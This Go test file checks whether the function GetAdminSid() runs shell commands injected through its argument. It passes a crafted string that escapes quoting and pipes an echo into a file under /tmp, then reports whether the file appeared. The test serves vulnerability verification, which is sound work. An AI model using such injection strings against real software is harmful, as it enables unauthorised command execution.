package admin

import (
	"fmt"
	"github.com/google/uuid"
	"io"
	"os"
	"strings"
	"testing"
)

// Verify `GetAdminSid()` Vulnerability
func TestGetAdminSid(t *testing.T) {
	payloadStr := uuid.NewString()
	payloadVerify := "/tmp/" + uuid.NewString()
	payload := fmt.Sprintf("\";'| echo '%s' > %s |echo '", payloadStr, payloadVerify)

	// The location of the vulnerability
	_, err := GetAdminSid(payload)
	if err != nil {
		t.Fatalf("[-] RUN ERROR %s", err)
	}

	f, err := os.Open(payloadVerify)
	if err != nil {
		fmt.Printf("[*] Vulnerability verification failures !\n")
		t.Fatalf("[-] RUN ERROR %s", err)
	}

	readAll, err := io.ReadAll(f)
	if err != nil {
		t.Fatalf("[-] RUN ERROR %s", err)
	}

	s := strings.ReplaceAll(string(readAll), "\n", "")
	if strings.Compare(s, payloadStr) == 0 {
		fmt.Printf("[*] Vulnerability verification successful !")
	} else {
		fmt.Printf("[*] Vulnerability verification failures !\n")
	}
}
